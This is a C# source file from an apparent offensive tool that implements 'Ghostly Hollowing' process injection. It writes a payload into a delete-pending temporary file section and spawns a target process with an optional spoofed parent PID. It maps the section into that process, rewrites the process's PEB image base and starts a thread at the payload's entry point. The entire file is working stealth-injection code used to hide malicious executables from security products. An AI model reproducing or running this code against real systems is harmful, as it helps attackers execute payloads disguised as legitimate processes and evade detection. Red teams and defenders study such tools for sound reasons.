using System;
using System.IO;
using GhostlyHollowing.Interop;

namespace GhostlyHollowing.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateGhostlyHollowingProcess(
            byte[] imageData,
            string commandLine,
            int ppid,
            bool isBlocking,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            IntPtr hGhostSection;
            IntPtr pNewSectionBase;
            IntPtr pPeb;
            IntPtr pRemoteEntryPoint;
            IntPtr pRemoteProcessParameters;
            uint nEntryPointOffset;
            PeFile.IMAGE_FILE_MACHINE archImage;
            PeFile.IMAGE_FILE_MACHINE archTarget;
            bool is64BitImage;
            string imagePathName;
            bool status = false;
            IntPtr hHollowingProcess = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;
            string tempFilePath = Path.GetTempFileName();

            if (Environment.Is64BitOperatingSystem && (IntPtr.Size != 8))
            {
                Console.WriteLine("[!] In 64bit OS, should be built as 64bit binary.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem && (IntPtr.Size != 4))
            {
                Console.WriteLine("[!] In 32bit OS, should be built as 32bit binary.");

                return false;
            }

            Console.WriteLine("[>] Loading image data.");

            try
            {
                using (var peImage = new PeFile(imageData))
                {
                    archImage = peImage.Architecture;
                    nEntryPointOffset = peImage.GetAddressOfEntryPoint();
                    is64BitImage = peImage.Is64Bit;
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to load image data.");

                return false;
            }

            Console.WriteLine("[+] Image data is loaded successfully.");
            Console.WriteLine("    [*] Architecture : {0}", archImage.ToString());

            if (Environment.Is64BitOperatingSystem && !is64BitImage)
            {
                Console.WriteLine("[-] Should be x64 PE data in 64bit OS.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem && is64BitImage)
            {
                Console.WriteLine("[-] Should be x86 PE data in 32bit OS.");

                return false;
            }

            do
            {
                Console.WriteLine("[>] Trying to load target image file.");

                imagePathName = Helpers.ResolveImagePathName(commandLine);

                if (string.IsNullOrEmpty(imagePathName))
                {
                    Console.WriteLine("[-] Failed to resolve target image path.");
                    break;
                }
                else
                {
                    try
                    {
                        using (var peImage = new PeFile(imagePathName))
                        {
                            archTarget = peImage.Architecture;

                            Console.WriteLine("[+] Taget image is loaded successfully.");
                            Console.WriteLine("    [*] Image Path Name : {0}", imagePathName);
                            Console.WriteLine("    [*] Architecture    : {0}", archTarget.ToString());
                        }
                    }
                    catch
                    {
                        Console.WriteLine("[!] Failed to load target image.");
                        break;
                    }
                }

                if (archImage != archTarget)
                {
                    Console.WriteLine("[!] Payload architecture should be matched with target image architecture.");
                    break;
                }

                Console.WriteLine("[>] Trying to create delete pending file.");
                Console.WriteLine("    [*] File Path : {0}", tempFilePath);

                hGhostSection = Utilities.CreateDeletePendingFileSection(tempFilePath, imageData);

                if (hGhostSection == Win32Consts.INVALID_HANDLE_VALUE)
                    break;

                status = Utilities.CreateInitialProcess(
                    commandLine,
                    ppid,
                    isBlocking,
                    windowTitle,
                    out hHollowingProcess,
                    out hThread);

                if (!status)
                    break;

                Console.WriteLine("[>] Trying to map delete pending section to the hollowing process.");

                pNewSectionBase = Utilities.MapSectionToProcess(hHollowingProcess, hGhostSection);

                if (pNewSectionBase == IntPtr.Zero)
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Delete pending section is mapped to the hollowing process successfully.");
                    Console.WriteLine("    [*] Section Base : 0x{0}", pNewSectionBase.ToString((Environment.Is64BitProcess) ? "X16" : "X8"));
                }

                if (Environment.Is64BitProcess)
                    pRemoteEntryPoint = new IntPtr(pNewSectionBase.ToInt64() + nEntryPointOffset);
                else
                    pRemoteEntryPoint = new IntPtr(pNewSectionBase.ToInt32() + (int)nEntryPointOffset);

                Console.WriteLine("[>] Trying to get ntdll!_PEB address for the hollowing process.");

                status = Helpers.GetProcessBasicInformation(
                    hHollowingProcess,
                    out PROCESS_BASIC_INFORMATION pbi);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to get ntdll!_PEB address for the hollowing process.");
                    break;
                }
                else
                {
                    pPeb = pbi.PebBaseAddress;
                    Console.WriteLine("[+] Got hollowing process basic information.");
                    Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((Environment.Is64BitProcess) ? "X16" : "X8"));
                    Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
                }

                // Overwrite ntdll!_PEB for hollowing process.
                if (!Helpers.SetImageBaseAddress(hHollowingProcess, pPeb, pNewSectionBase))
                {
                    Console.WriteLine("[-] Failed to set new ntdll!_PEB.ImageBaseAddress.");
                    break;
                }

                Console.WriteLine("[>] Trying to set process parameters to the hollowing process.");

                pRemoteProcessParameters = Utilities.SetProcessParameters(
                    hHollowingProcess,
                    imagePathName,
                    commandLine,
                    Environment.CurrentDirectory,
                    windowTitle);

                if (pRemoteProcessParameters == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to set process parameters.");
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Process parameters are set successfully.");
                }

                Console.WriteLine("[>] Trying to start hollowing process thread.");

                ntstatus = NativeMethods.NtCreateThreadEx(
                    out IntPtr hNewThread,
                    ACCESS_MASK.THREAD_ALL_ACCESS,
                    IntPtr.Zero,
                    hHollowingProcess,
                    pRemoteEntryPoint,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to create thread.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
                else
                {
                    Console.WriteLine("[+] Thread is resumed successfully.");
                    NativeMethods.NtClose(hNewThread);
                }
            } while (false);

            if (hThread != IntPtr.Zero)
                NativeMethods.NtTerminateThread(hThread, Win32Consts.STATUS_SUCCESS);
            
            if (hHollowingProcess != IntPtr.Zero)
            {
                if (!status)
                    NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);
                
                NativeMethods.NtClose(hHollowingProcess);
            }

            try
            {
                if (File.Exists(tempFilePath))
                    File.Delete(tempFilePath);
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
            }

            return status;
        }
    }
}
